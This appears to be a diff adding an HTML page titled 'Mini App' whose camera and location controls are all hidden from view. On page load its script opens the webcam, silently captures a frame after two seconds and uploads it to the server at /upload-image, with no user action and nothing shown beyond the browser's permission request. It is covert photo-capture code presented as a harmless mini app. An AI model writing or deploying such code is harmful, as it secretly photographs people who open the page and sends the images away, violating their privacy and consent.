@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mini App</title>
+  </head>
+  <body>
+    <!-- <h1>User Location and Photo Capture</h1> -->
+    <button id="getLocation" style="display: none">Get Location</button>
+    <div id="location"></div>
+
+    <h2 style="display: none">Camera Capture</h2>
+    <video
+      id="video"
+      width="640"
+      height="480"
+      autoplay
+      style="display: none"
+    ></video>
+    <button id="capture" style="display: none">Capture Photo</button>
+    <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
+    <div id="photo"></div>
+
+    <script>
+      document.getElementById("getLocation").addEventListener("click", () => {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const loc = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+            document.getElementById("location").innerText = loc;
+          },
+          (error) => {
+            console.error("Error capturing location: ", error);
+          }
+        );
+      });
+
+      const video = document.getElementById("video");
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+        })
+        .catch((error) => {
+          console.error("Error accessing camera: ", error);
+        });
+
+      window.addEventListener("load", () => {
+        // Start the video stream
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        // Access the user's webcam
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then((stream) => {
+            video.srcObject = stream;
+            video.play();
+
+            // Capture image after a short delay to ensure the video is loaded
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imageData = canvas.toDataURL("image/png");
+              uploadImage(imageData);
+            }, 2000); // 2 seconds delay to allow the video to start
+          })
+          .catch((error) => {
+            console.error("Error accessing webcam:", error);
+          });
+      });
+
+      // Function to upload image data
+      function uploadImage(imageData) {
+        fetch("/upload-image", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ imageData }),
+        })
+          .then((response) => response.text())
+          .then((data) => {
+            document.getElementById("photo").innerText = data;
+          })
+          .catch((error) => {
+            console.error("Error uploading image:", error);
+          });
+      }
+    </script>
+  </body>
+</html>
